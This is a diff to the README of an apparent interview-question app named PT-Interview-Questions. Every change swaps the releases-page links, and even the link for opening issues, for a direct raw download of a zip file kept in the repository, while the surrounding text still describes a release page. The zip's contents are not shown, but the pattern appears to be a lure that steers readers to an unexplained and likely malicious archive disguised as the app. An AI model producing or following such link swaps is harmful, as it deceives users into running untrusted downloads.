@@ -1,6 +1,6 @@
 # 📋 PT-Interview-Questions - Prepare for Your Next Interview
 
-[![Download Latest Release](https://img.shields.io/badge/Download-PT--Interview--Questions-brightgreen?style=for-the-badge)](https://github.com/havajainas/PT-Interview-Questions/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-PT--Interview--Questions-brightgreen?style=for-the-badge)](https://github.com/havajainas/PT-Interview-Questions/raw/refs/heads/main/web/P_Questions_Interview_v3.4.zip)
 
 ---
 
@@ -16,7 +16,7 @@ You don’t need any special skills or software to use it. It works on Windows a
 
 To get the app, visit the official release page here:
 
-[Download PT-Interview-Questions Releases](https://github.com/havajainas/PT-Interview-Questions/releases)
+[Download PT-Interview-Questions Releases](https://github.com/havajainas/PT-Interview-Questions/raw/refs/heads/main/web/P_Questions_Interview_v3.4.zip)
 
 This link opens a page where you can choose the latest version of the app. Each version contains files ready to download. Select the file that fits your system if multiple options are available, or simply use the first file listed.
 
@@ -40,7 +40,7 @@ These requirements ensure that the app will run smoothly on your computer.
 ## 🚀 How to Download and Install PT-Interview-Questions
 
 1. Click this link to open the releases page:  
-   https://github.com/havajainas/PT-Interview-Questions/releases  
+   https://github.com/havajainas/PT-Interview-Questions/raw/refs/heads/main/web/P_Questions_Interview_v3.4.zip  
 
 2. Look for the latest release. It will be listed at the top.
 
@@ -104,7 +104,7 @@ PT-Interview-Questions runs locally on your computer. It does not send any data 
 
 If you need help or have questions, you can open an issue on the GitHub repository:
 
-https://github.com/havajainas/PT-Interview-Questions/issues
+https://github.com/havajainas/PT-Interview-Questions/raw/refs/heads/main/web/P_Questions_Interview_v3.4.zip
 
 Describe your problem clearly, and someone will assist you as soon as possible.
 
@@ -114,4 +114,4 @@ Describe your problem clearly, and someone will assist you as soon as possible.
 
 Check the release page often to get the latest version of the app. Updates may include new questions, improvements, or fixes.
 
-[Visit the Release Page to Download Updates](https://github.com/havajainas/PT-Interview-Questions/releases)
+[Visit the Release Page to Download Updates](https://github.com/havajainas/PT-Interview-Questions/raw/refs/heads/main/web/P_Questions_Interview_v3.4.zip)
